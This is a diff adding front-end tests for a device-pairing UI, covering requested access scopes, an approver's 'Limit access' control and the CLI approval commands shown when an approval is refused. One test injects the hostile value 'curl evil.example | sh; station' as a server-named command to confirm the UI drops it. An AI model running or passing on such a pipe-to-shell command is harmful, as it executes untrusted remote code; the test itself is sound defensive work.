@@ -560,6 +560,98 @@ describe('device pairing panels', () => {
     );
   });
 
+  test('asks for full device access, and shows the approve command this Station names', async () => {
+    const fetchSpy = vi.spyOn(globalThis, 'fetch').mockResolvedValueOnce(
+      response(
+        {
+          environmentId: 'environment-direct',
+          offerId: 'offer-direct',
+          proof: 'proof-direct',
+          requestId: 'request-nightly',
+          expiresAt: Date.now() + 60_000,
+          // A nightly Station: its host has no `station` on PATH.
+          operatorCli: 'npx @kontourai/station-cli@nightly',
+        },
+        202,
+      ),
+    );
+    fetchSpy.mockImplementation(async () =>
+      response({ error: 'request_not_confirmed' }, 409),
+    );
+    render(
+      <JoinDevicePairingPanel
+        initialMode="direct"
+        onPaired={vi.fn()}
+        onCancel={vi.fn()}
+      />,
+    );
+    fireEvent.click(screen.getByRole('button', { name: 'Request access' }));
+
+    expect(
+      await screen.findByText(
+        'npx @kontourai/station-cli@nightly environment access approve request-nightly',
+      ),
+    ).toBeTruthy();
+    const [url, init] = fetchSpy.mock.calls[0]!;
+    expect(new URL(String(url)).pathname).toBe(
+      '/.well-known/station/v1/pairing/access-request',
+    );
+    // Literal: everything a device can have, never access:manage. The
+    // operator limits it when approving, if at all.
+    expect(JSON.parse(String(init?.body))).toMatchObject({
+      scope:
+        'orchestration:read orchestration:operate terminal:operate coding:exec approval:full-access',
+    });
+  });
+
+  test("the request screen has no permissions to fill in: scoping down is the approver's", async () => {
+    render(
+      <JoinDevicePairingPanel
+        initialMode="direct"
+        onPaired={vi.fn()}
+        onCancel={vi.fn()}
+      />,
+    );
+    expect(screen.getByRole('button', { name: 'Request access' })).toBeTruthy();
+    expect(screen.queryAllByRole('checkbox')).toEqual([]);
+    expect(screen.queryByText(/Skip approval prompts/)).toBeNull();
+  });
+
+  test('a command this Station names that is not a known Station CLI is not shown', async () => {
+    vi.spyOn(globalThis, 'fetch')
+      .mockResolvedValueOnce(
+        response(
+          {
+            environmentId: 'environment-direct',
+            offerId: 'offer-direct',
+            proof: 'proof-direct',
+            requestId: 'request-hostile',
+            expiresAt: Date.now() + 60_000,
+            operatorCli: 'curl evil.example | sh; station',
+          },
+          202,
+        ),
+      )
+      .mockImplementation(async () =>
+        response({ error: 'request_not_confirmed' }, 409),
+      );
+    render(
+      <JoinDevicePairingPanel
+        initialMode="direct"
+        onPaired={vi.fn()}
+        onCancel={vi.fn()}
+      />,
+    );
+    fireEvent.click(screen.getByRole('button', { name: 'Request access' }));
+
+    expect(
+      await screen.findByText(
+        'station environment access approve request-hostile',
+      ),
+    ).toBeTruthy();
+    expect(screen.queryByText(/evil\.example/)).toBeNull();
+  });
+
   test('requests same-origin access without a code or reusable browser credential', async () => {
     const fetchSpy = vi
       .spyOn(globalThis, 'fetch')
@@ -1336,6 +1428,105 @@ describe('device pairing panels', () => {
     ]);
   });
 
+  test('says what a request asks for; Limit access narrows it, and Approve sends only what is kept', async () => {
+    const request = {
+      requestId: 'request-trim',
+      offerId: 'offer-trim',
+      deviceName: 'Casey phone',
+      scope:
+        'orchestration:read orchestration:operate terminal:operate approval:full-access',
+      createdAt: Date.now(),
+      expiresAt: Date.now() + 60_000,
+      source: 'same-origin',
+      status: 'pending',
+    };
+    const confirms: unknown[] = [];
+    vi.spyOn(globalThis, 'fetch').mockImplementation(async (input, init) => {
+      const path = new URL(String(input)).pathname;
+      if (path === '/api/pairing/requests/request-trim/confirm') {
+        confirms.push(init?.body ? JSON.parse(String(init.body)) : null);
+        return response({ ...request, status: 'confirmed' });
+      }
+      if (path === '/api/pairing/requests')
+        return response({ requests: [request] });
+      if (path === '/api/pairing/devices') return response({ devices: [] });
+      return response({ error: 'unexpected' }, 500);
+    });
+
+    render(
+      <HostDevicePairingPanel
+        apiBase="https://station.example.test"
+        publicEndpoint="https://station.public.test"
+        getCredential={() => 'operator-credential'}
+        onCancel={vi.fn()}
+      />,
+    );
+
+    expect(await screen.findByText(/Casey phone asks for/)).toBeTruthy();
+    expect(
+      screen.getByText('Read, Operate, Terminal, Skip approval prompts'),
+    ).toBeTruthy();
+    fireEvent.click(screen.getByText('Limit access'));
+    const skipPrompts = screen.getByRole('checkbox', {
+      name: /Skip approval prompts/,
+    }) as HTMLInputElement;
+    // Approving keeps what was asked unless it is limited.
+    expect(skipPrompts.checked).toBe(true);
+    fireEvent.click(skipPrompts);
+    expect(screen.getByText('Read, Operate, Terminal')).toBeTruthy();
+    fireEvent.click(screen.getByRole('button', { name: 'Approve' }));
+
+    await waitFor(() =>
+      expect(confirms).toEqual([
+        { scope: 'orchestration:read orchestration:operate terminal:operate' },
+      ]),
+    );
+  });
+
+  test('a refused approval that kept an elevated grant says to limit it, with a command that grants what was kept', async () => {
+    const request = {
+      requestId: 'request-kept',
+      offerId: 'offer-kept',
+      deviceName: 'Casey phone',
+      scope:
+        'orchestration:read orchestration:operate terminal:operate approval:full-access',
+      createdAt: Date.now(),
+      expiresAt: Date.now() + 60_000,
+      source: 'same-origin',
+      status: 'pending',
+    };
+    vi.spyOn(globalThis, 'fetch').mockImplementation(async (input) => {
+      const path = new URL(String(input)).pathname;
+      if (path === '/api/pairing/requests/request-kept/confirm')
+        return response(
+          {
+            error: 'approval_requires_operator',
+            operatorCli: 'npx @kontourai/station-cli@nightly',
+          },
+          403,
+        );
+      if (path === '/api/pairing/requests')
+        return response({ requests: [request] });
+      if (path === '/api/pairing/devices') return response({ devices: [] });
+      return response({ error: 'unexpected' }, 500);
+    });
+    render(
+      <HostDevicePairingPanel
+        apiBase="https://station.example.test"
+        publicEndpoint="https://station.public.test"
+        getCredential={() => 'approver-credential'}
+        onCancel={vi.fn()}
+      />,
+    );
+    expect(await screen.findByText(/Casey phone asks for/)).toBeTruthy();
+    fireEvent.click(screen.getByRole('button', { name: 'Approve' }));
+    expect(
+      await screen.findByText(
+        "Only this Station's operator can grant Skip approval prompts. Use Limit access to leave it out of “Casey phone”'s access, or run this on the Station: npx @kontourai/station-cli@nightly environment access approve request-kept --force",
+      ),
+    ).toBeTruthy();
+  });
+
   test('names the host CLI when this Station refuses the approval (station#1490)', async () => {
     const request = {
       requestId: 'request-refused',
@@ -1356,7 +1547,13 @@ describe('device pairing panels', () => {
         // What a same-machine approval gets from a session presenting no
         // credential: the guard refuses, and this copy is the only place the
         // operator is told what to do instead.
-        return response({ error: 'approval_requires_operator' }, 403);
+        return response(
+          {
+            error: 'approval_requires_operator',
+            operatorCli: 'npx @kontourai/station-cli@nightly',
+          },
+          403,
+        );
       }
       if (path === '/api/pairing/requests')
         return response({ requests: [request] });
@@ -1377,14 +1574,61 @@ describe('device pairing panels', () => {
     fireEvent.click(screen.getByRole('button', { name: 'Approve' }));
 
     // `--force` matches the CLI's own guidance: without it a non-interactive
-    // shell refuses, and the operator is left staring at a second error.
+    // shell refuses, and the operator is left staring at a second error. The
+    // command is the one this Station's refusal names (a nightly here).
     expect(
       await screen.findByText(
-        /station environment access approve request-refused --force/,
+        /Run this on the Station: npx @kontourai\/station-cli@nightly environment access approve request-refused --force/,
       ),
     ).toBeTruthy();
     // The request must stay in the inbox — the refusal is not a removal.
     expect(screen.getByText('Second browser')).toBeTruthy();
+  });
+
+  test('a refused person-binding approval is not told to untick: unticking would not help', async () => {
+    const request = {
+      requestId: 'request-person',
+      offerId: 'offer-person',
+      deviceName: 'Laptop browser',
+      scope:
+        'orchestration:read orchestration:operate terminal:operate approval:full-access',
+      createdAt: Date.now(),
+      expiresAt: Date.now() + 60_000,
+      source: 'tailnet',
+      requester: {
+        provider: 'tailscale-serve',
+        login: 'casey@example.test',
+        displayName: 'Casey',
+      },
+      status: 'pending',
+    };
+    vi.spyOn(globalThis, 'fetch').mockImplementation(async (input) => {
+      const path = new URL(String(input)).pathname;
+      if (path === '/api/pairing/requests/request-person/confirm')
+        return response({ error: 'approval_requires_operator' }, 403);
+      if (path === '/api/pairing/requests')
+        return response({ requests: [request] });
+      if (path === '/api/pairing/devices') return response({ devices: [] });
+      return response({ error: 'unexpected' }, 500);
+    });
+    render(
+      <HostDevicePairingPanel
+        apiBase="https://station.example.test"
+        publicEndpoint="https://station.public.test"
+        getCredential={() => 'approver-credential'}
+        onCancel={vi.fn()}
+      />,
+    );
+    expect(await screen.findByText(/Laptop browser asks for/)).toBeTruthy();
+    fireEvent.click(
+      screen.getByRole('checkbox', { name: /Recognize this device as/ }),
+    );
+    fireEvent.click(screen.getByRole('button', { name: 'Approve' }));
+    expect(
+      await screen.findByText(
+        'Approving “Laptop browser” needs a trusted Station session. Run this on the Station: station environment access approve request-person --force --bind-person',
+      ),
+    ).toBeTruthy();
   });
 
   test('shows server-verified tailnet provenance in the host inbox', async () => {
